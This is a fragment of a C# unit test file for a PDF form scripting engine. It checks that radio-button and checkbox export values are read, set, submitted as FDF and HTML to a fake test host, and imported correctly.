        var doc = OptForm("var r = getField\\('r'\\), c = getField\\('cb'\\); getField\\('a'\\).value = [r.value, r.exportValues.join\\('+'\\), " +
            "r.isBoxChecked\\(0\\), r.isBoxChecked\\(1\\), c.value, c.exportValues[0]].join\\('|'\\);");
        Assert.Equal("Été|Été+Été|false|true|Oui|Oui", ValueOf(Run(doc, "go", host).Data!, "a"));

        // checkThisBox picks the widget, even when the export values are the same.
        var set = OptForm("getField\\('r'\\).checkThisBox\\(0\\); getField\\('a'\\).value = getField\\('r'\\).isBoxChecked\\(0\\) + '' + getField\\('r'\\).isBoxChecked\\(1\\);");
        Assert.Equal("truefalse", ValueOf(Run(set, "go", host).Data!, "a"));

        // Setting the export value turns its widget on; "Off" clears.
        var byValue = OptForm("getField\\('cb'\\).value = 'Off'; var a = getField\\('cb'\\).value; getField\\('cb'\\).value = 'Oui'; " +
            "getField\\('a'\\).value = a + '>' + getField\\('cb'\\).value;", checkValue: "/Off");
        var data = Run(byValue, "go", host).Data!;
        Assert.Equal("Off>Oui", ValueOf(data, "a"));
        Assert.Equal("0", ValueOf(data, "cb")); // stored as the state name
    }

    [Fact]
    public void OptExportValuesAreSubmittedAndImported()
    {
        var host = new FakeHost();
        Run(OptForm("this.submitForm\\('https://x.test/s'\\); this.submitForm\\({cURL: 'https://x.test/h', cSubmitAs: 'HTML'}\\);"), "go", host);
        var fdf = FormData.Parse(host.Submits[0].Body)!;
        Assert.Equal(["Été"], fdf["r"]);
        Assert.Equal(["Oui"], fdf["cb"]);
        var html = Encoding.ASCII.GetString(host.Submits[1].Body);
        Assert.Contains("cb=Oui", html, StringComparison.Ordinal);
        Assert.Contains("r=%C3%89t%C3%A9", html, StringComparison.Ordinal);

        // Imported FDF data with export values selects the matching states.
        var import = new FakeHost { ImportBytes = FormData.Fdf([new FormData.Entry("cb", ["Oui"], true), new FormData.Entry("r", ["Été"], true)], null) };
        var r = Run(OptForm("this.importAnFDF\\(\\);", radioValue: "/Off", checkValue: "/Off"), "go", import);
        Assert.Equal("0", ValueOf(r.Data!, "cb"));

        // SetValues takes export values as well as state names.
        var filled = FormEditor.SetValues(OptForm("1;", checkValue: "/Off"), null, new Dictionary<string, string> { ["cb"] = "Oui" });
        Assert.Equal("0", ValueOf(filled, "cb"));
    }
}
